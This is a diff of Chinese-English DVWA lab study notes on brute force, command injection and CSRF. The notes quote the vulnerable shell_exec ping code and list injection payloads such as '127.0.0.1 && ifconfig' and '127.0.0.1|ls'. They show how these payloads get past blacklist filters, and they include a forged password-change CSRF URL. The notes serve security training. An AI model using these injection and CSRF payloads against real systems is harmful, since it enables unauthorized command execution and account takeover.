@@ -1,6 +1,7 @@
 
-https://blog.csdn.net/qq_29277155/article/details/52726730
-
+	https://blog.csdn.net/qq_29277155/article/details/52726730
+	
+	https://blog.csdn.net/BROTHERYY/article/details/108142354
 
 Brute Force
 	burpsuite
@@ -25,12 +26,26 @@ Brute Force
 	if( ( $data->rowCount() == 1 ) && ( $row[ 'failed_login' ] >= $total_failed_login ) )  {}
 	
 Command Injection
-	127.0.0.1
-	127.0.0.1 && ifconfig
-	127.0.0.1 && pwd
-		command1 && command2   先执行command1后执行command2
+
+	$cmd = shell_exec( 'ping  -c 4 ' . $target ); echo "<pre>{$cmd}</pre>"; 
+		127.0.0.1
+		127.0.0.1 && ifconfig
+		127.0.0.1 && pwd
+	
+	$substitutions = array(        '&&' => '',   ';'  => '',    );
+		127.0 || ifconfig
+	
+	$substitutions = array(  '&'  => '',  ';'  => '','| ' => '','-'  => '','$'  => '','('  => '', ')'  => '', '`'  => '','||' => '',); 	
+			'| ' => '',
+				127.0.0.1|ls
+			127.0.0.1 |||||| pwd
+		
+	正则表达式
+	
+		command1 & command2    command1与command2同时执行，不管command 1是否执行成功
+		command1 && command2   先执行command1，如果为真，再执行command2
 		command1 | command2    只执行command2
-		command1 & command2    先执行command2后执行command1
+		command1 || command2   先执行command1，如果为假，再执行command2
 	
 CSRF
 	http://1.117.162.201/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#
